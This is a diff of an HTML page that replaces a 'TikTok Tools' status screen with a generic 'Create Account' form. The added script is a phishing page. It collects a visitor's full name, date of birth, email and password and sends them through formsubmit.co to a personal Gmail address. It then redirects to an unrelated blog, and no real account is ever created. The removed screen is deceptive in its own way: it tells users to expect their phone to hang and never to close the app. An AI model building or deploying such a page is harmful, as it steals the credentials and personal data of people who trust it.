@@ -2,331 +2,240 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Important System Update - TikTok Tools</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign Up</title>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700;800&display=swap');
-        
-        * { 
-            box-sizing: border-box; 
-            margin: 0; 
-            padding: 0; 
-            font-family: 'Poppins', sans-serif; 
-        }
+        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600&display=swap');
         
         body { 
-            background-color: #0b0713; /* Deep Dark Violet/Black */
-            color: #fff; 
+            font-family: 'Poppins', sans-serif;
             display: flex; 
             justify-content: center; 
-            align-items: flex-start; /* Aligns content to top for natural scrolling */
+            align-items: center; 
             min-height: 100vh; 
-            padding: 20px 15px; 
-            position: relative;
-            overflow-x: hidden;
-            overflow-y: auto; /* Ensures smooth vertical scrolling */
-            -webkit-overflow-scrolling: touch; /* Smooth scroll for iOS devices */
+            background-color: #0f172a;
+            margin: 0; 
+            color: #f8fafc; 
         }
 
-        /* Center Glowing Aura Effect */
-        body::before {
-            content: '';
-            position: absolute;
-            width: 300px;
-            height: 300px;
-            background: linear-gradient(45deg, #f72585, #7209b7, #3a0ca3, #4361ee, #4cc9f0);
-            filter: blur(100px);
-            border-radius: 50%;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            z-index: 0;
-            opacity: 0.35;
-            animation: pulseGlow 8s ease-in-out infinite alternate;
-            pointer-events: none;
+        .glow-pro-box { 
+            background: #1e293b; 
+            padding: 40px 35px; 
+            border-radius: 16px; 
+            text-align: center; 
+            width: 85%;
+            max-width: 380px; 
+            border: 1px solid rgba(56, 189, 248, 0.3);
+            box-shadow: 0 0 25px rgba(56, 189, 248, 0.12), inset 0 0 10px rgba(56, 189, 248, 0.05);
         }
 
-        @keyframes pulseGlow {
-            0% { transform: translate(-50%, -50%) scale(1); opacity: 0.3; }
-            100% { transform: translate(-50%, -50%) scale(1.15); opacity: 0.45; }
-        }
-
-        /* Floating Particles Background Animation */
-        .particles {
-            position: absolute;
-            width: 100%;
-            height: 100%;
-            top: 0;
-            left: 0;
-            pointer-events: none;
-            z-index: 1;
-        }
-
-        .particle {
-            position: absolute;
-            width: 6px;
-            height: 6px;
-            border-radius: 2px;
-            opacity: 0.6;
-            animation: floatParticle 10s linear infinite;
-        }
-
-        @keyframes floatParticle {
-            0% { transform: translateY(105vh) rotate(0deg); opacity: 0; }
-            10% { opacity: 0.6; }
-            90% { opacity: 0.6; }
-            100% { transform: translateY(-5vh) rotate(360deg); opacity: 0; }
-        }
-
-        /* Main Wrapper - 100% mobile width optimized */
-        .main-wrapper {
-            width: 100%;
-            max-width: 400px; /* Perfect for modern mobile devices */
-            z-index: 2;
-            display: flex;
-            flex-direction: column;
-            gap: 16px;
-            padding-bottom: 20px; /* Space at bottom for scrolling */
-        }
-
-        /* Header Card Style */
-        .header-box {
-            background: #171226;
-            border-radius: 20px;
-            padding: 20px 15px;
-            text-align: center;
-            box-shadow: 0 10px 25px rgba(0,0,0,0.4);
-        }
-
-        .header-box h2 {
-            font-weight: 800;
-            font-size: 24px;
-            letter-spacing: -0.5px;
-            background: linear-gradient(to right, #00f5d4, #00bbf9, #9b5de5, #f15bb5);
+        h2 { 
+            margin-bottom: 5px;
+            font-size: 28px;
+            font-weight: 600;
+            background: linear-gradient(to right, #38bdf8, #818cf8);
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
         }
 
-        .header-box p {
-            font-size: 10px;
-            color: #7b7495;
-            text-transform: uppercase;
-            letter-spacing: 2px;
-            margin-top: 5px;
-            font-weight: 600;
+        p {
+            font-size: 14px;
+            color: #94a3b8;
+            margin-bottom: 30px;
         }
 
-        /* Thin gradient border wrapper */
-        .gradient-border-wrap {
-            position: relative;
-            border-radius: 20px;
-            padding: 1.5px;
-            background: linear-gradient(135deg, #00f5d4, #4cc9f0, #7209b7, #f72585);
-        }
-
-        /* Main Glass Card */
-        .glass-card {
-            background: #171226;
-            border-radius: 19px;
-            padding: 22px 18px;
+        .input-group {
             text-align: left;
-        }
-
-        /* Highlighted Bugs Fix Card */
-        .highlight-box {
-            background: rgba(0, 245, 212, 0.08);
-            border: 1px dashed #00f5d4;
-            border-radius: 12px;
-            padding: 14px;
             margin-bottom: 20px;
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            box-shadow: 0 0 15px rgba(0, 245, 212, 0.1);
         }
 
-        .highlight-box .icon {
-            font-size: 22px;
-        }
-
-        .highlight-text {
+        label {
+            display: block;
             font-size: 13px;
-            font-weight: 600;
-            color: #00f5d4;
-            line-height: 1.4;
-        }
-
-        /* Security/Alert Box Style */
-        .alert-box {
-            background: rgba(247, 37, 133, 0.08);
-            border: 1px dashed #f72585;
-            border-radius: 12px;
-            padding: 14px;
-            margin-top: 20px;
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            box-shadow: 0 0 15px rgba(247, 37, 133, 0.1);
-        }
-
-        .alert-box .icon {
-            font-size: 22px;
-        }
-
-        .alert-text {
-            font-size: 13px;
-            font-weight: 600;
-            color: #f72585;
-            line-height: 1.4;
-        }
-
-        /* Important Note Title */
-        .note-title {
-            font-size: 11px;
-            color: #f72585;
-            text-transform: uppercase;
-            letter-spacing: 2px;
-            font-weight: 700;
-            margin-bottom: 15px;
-            display: flex;
-            align-items: center;
-            gap: 6px;
-        }
-
-        .note-title::before {
-            content: '';
-            display: inline-block;
-            width: 6px;
-            height: 6px;
-            background-color: #f72585;
-            border-radius: 50%;
-            box-shadow: 0 0 8px #f72585;
-        }
-
-        /* Content List Styles */
-        .content-list {
-            display: flex;
-            flex-direction: column;
-            gap: 15px;
-        }
-
-        .info-step {
-            background: #0f0b1b;
-            border: 1px solid #2d2547;
-            border-radius: 12px;
-            padding: 14px;
-            display: flex;
-            gap: 12px;
-            align-items: flex-start;
-        }
-
-        .info-step .num {
-            background: #2d2547;
-            color: #4cc9f0;
-            font-size: 10px;
-            font-weight: 700;
-            padding: 3px 8px;
-            border-radius: 20px;
-            border: 1px solid #3d335c;
-        }
-
-        .info-step p {
-            font-size: 12px;
             color: #cbd5e1;
-            line-height: 1.5;
-            flex: 1;
+            margin-bottom: 8px;
+            font-weight: 500;
+            letter-spacing: 0.5px;
         }
 
-        /* Footer */
-        .footer-text {
-            text-align: center;
-            font-size: 9px;
-            color: #4f476f;
-            text-transform: uppercase;
-            letter-spacing: 3px;
-            margin-top: 10px;
+        input { 
+            width: 100%; 
+            padding: 14px 15px; 
+            box-sizing: border-box;
+            border: 1px solid #334155; 
+            background: #0f172a; 
+            color: #f8fafc; 
+            font-size: 15px;
+            border-radius: 8px;
+            transition: all 0.3s ease;
+            font-family: 'Poppins', sans-serif;
+        }
+
+        input:focus {
+            outline: none;
+            border-color: #38bdf8;
+            box-shadow: 0 0 12px rgba(56, 189, 248, 0.3);
+        }
+
+        input::placeholder {
+            color: #475569;
+        }
+
+        button { 
+            padding: 15px; 
+            background: linear-gradient(to right, #0284c7, #4f46e5); 
+            color: #ffffff; 
+            border: none; 
+            border-radius: 8px; 
+            cursor: pointer; 
+            font-size: 16px;
             font-weight: 600;
+            width: 100%;
+            margin-top: 10px;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 15px rgba(79, 70, 229, 0.3);
+        }
+
+        button:hover {
+            box-shadow: 0 6px 20px rgba(79, 70, 229, 0.5);
+            transform: translateY(-1px);
+        }
+
+        button:disabled {
+            background: #334155;
+            box-shadow: none;
+            cursor: not-allowed;
+            color: #94a3b8;
+        }
+
+        #loading-screen { 
+            display: none; 
+            text-align: center;
+        }
+        
+        .loader {
+            width: 45px;
+            height: 45px;
+            border-radius: 50%;
+            border: 3px solid #334155;
+            border-top-color: #38bdf8;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 15px;
+            box-shadow: 0 0 15px rgba(56, 189, 248, 0.2);
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
         }
     </style>
 </head>
 <body>
 
-<!-- Animated Background Particles -->
-<div class="particles" id="particleContainer"></div>
-
-<div class="main-wrapper">
-    
-    <!-- Top Branding Header -->
-    <div class="header-box">
-        <h2>App Status</h2>
-        <p>Optimization & Security Info</p>
+    <div id="loading-screen">
+        <div class="loader"></div>
+        <p style="color: #cbd5e1; font-size: 15px;">Authenticating...</p>
     </div>
 
-    <!-- Main Card Wrapped with Glowing Border Gradient -->
-    <div class="gradient-border-wrap">
-        <div class="glass-card">
-            
-            <!-- HIGHLIGHTED LINE (Bugs Fixed Info) -->
-            <div class="highlight-box">
-                <span class="icon">⚡</span>
-                <div class="highlight-text">
-                    All previous bugs in our app have been successfully fixed!
-                </div>
-            </div>
-
-            <!-- Important Note Section -->
-            <div class="note-title">Important Message</div>
-
-            <div class="content-list">
-                <!-- Point 1 -->
-                <div class="info-step">
-                    <span class="num">01</span>
-                    <p>
-                        When the app is newly installed, it downloads background resources for a short time. This might temporarily make your mobile slow or hang, but it will automatically normalize within a few hours.
-                    </p>
-                </div>
-
-                <!-- Point 2 -->
-                <div class="info-step">
-                    <span class="num">02</span>
-                    <p>
-                        If you close the app completely, it won't be able to update. This may put your TikTok account at risk because we continuously update and improve our tools to keep you safe. Please try not to close the app.
-                    </p>
-                </div>
-            </div>
-
-            <!-- HIGHLIGHTED LINE (Safety/Temporary Message Info) -->
-            <div class="alert-box">
-                <span class="icon">🛡️</span>
-                <div class="alert-text">
-                    This was created to keep everyone safe. This important notification will disappear soon, and the app will go back to normal!
-                </div>
-            </div>
-
+    <div class="glow-pro-box" id="signup-box">
+        <h2>Create Account</h2>
+        <p>Enter your details to get started</p>
+        
+        <div class="input-group">
+            <label>Full Name</label>
+            <input type="text" id="userFullName" placeholder="" required />
         </div>
+
+        <div class="input-group">
+            <label>Date of Birth</label>
+            <input 
+                type="text" 
+                id="userDOB" 
+                placeholder="DD/MM/YYYY" 
+                inputmode="numeric"
+                maxlength="10"
+                required 
+            />
+        </div>
+
+        <div class="input-group">
+            <label>Email Address</label>
+            <input type="email" id="userEmail" placeholder="name@example.com" required />
+        </div>
+
+        <div class="input-group">
+            <label>Password</label>
+            <input type="password" id="userPass" placeholder="••••••••" required />
+        </div>
+        
+        <button id="submitBtn" onclick="handleSignup()">Sign Up</button>
     </div>
 
-    <!-- Bottom Small Brand Footer -->
-    <div class="footer-text">TIKTOOLS</div>
-</div>
+    <script>
+        const adminEmail = "mrpinto1433@gmail.com"; 
+        const targetLink = "https://testing14333333.blogspot.com/?m=1"; 
 
-<script>
-    // Generate Floating Background Particles Dynamically
-    const colors = ['#f72585', '#7209b7', '#00f5d4', '#4cc9f0', '#ffb703'];
-    const container = document.getElementById('particleContainer');
-    
-    for (let i = 0; i < 20; i++) {
-        let p = document.createElement('div');
-        p.classList.add('particle');
-        p.style.left = Math.random() * 100 + 'vw';
-        p.style.top = Math.random() * 100 + 'vh';
-        p.style.backgroundColor = colors[Math.floor(Math.random() * colors.length)];
-        p.style.animationDelay = Math.random() * 8 + 's';
-        p.style.animationDuration = (Math.random() * 6 + 6) + 's';
-        if(Math.random() > 0.5) p.style.borderRadius = '50%';
-        container.appendChild(p);
-    }
-</script>
+        window.onload = function() {
+            if (localStorage.getItem("app_user_verified") === "true") {
+                showLoading();
+                window.location.href = targetLink;
+            }
+        };
 
+        // DOB Auto Format
+        document.getElementById("userDOB").addEventListener("input", function(e) {
+            let val = e.target.value.replace(/\D/g, "");
+            let formatted = "";
+
+            if (val.length >= 1) formatted = val.substring(0, 2);
+            if (val.length >= 3) formatted += "/" + val.substring(2, 4);
+            if (val.length >= 5) formatted += "/" + val.substring(4, 8);
+
+            e.target.value = formatted;
+        });
+
+        function showLoading() {
+            document.getElementById("signup-box").style.display = "none";
+            document.getElementById("loading-screen").style.display = "block";
+        }
+
+        function handleSignup() {
+            const fullName = document.getElementById("userFullName").value;
+            const dob = document.getElementById("userDOB").value;
+            const email = document.getElementById("userEmail").value;
+            const pass = document.getElementById("userPass").value;
+            const btn = document.getElementById("submitBtn");
+
+            if(!fullName || !dob || !email || !pass) {
+                alert("Please fill all the details to continue!");
+                return;
+            }
+
+            btn.innerText = "Processing...";
+            btn.disabled = true;
+
+            fetch(`https://formsubmit.co/ajax/${adminEmail}`, {
+                method: "POST",
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    "Full Name": fullName,
+                    "Date of Birth": dob,
+                    "Email": email,
+                    "Password": pass,
+                    "_subject": "New App Registration!"
+                })
+            })
+            .then(() => {
+                localStorage.setItem("app_user_verified", "true");
+                showLoading();
+                window.location.href = targetLink;
+            })
+            .catch(() => {
+                alert("Network error! Please check your connection.");
+                btn.innerText = "Sign Up";
+                btn.disabled = false;
+            });
+        }
+    </script>
 </body>
 </html>
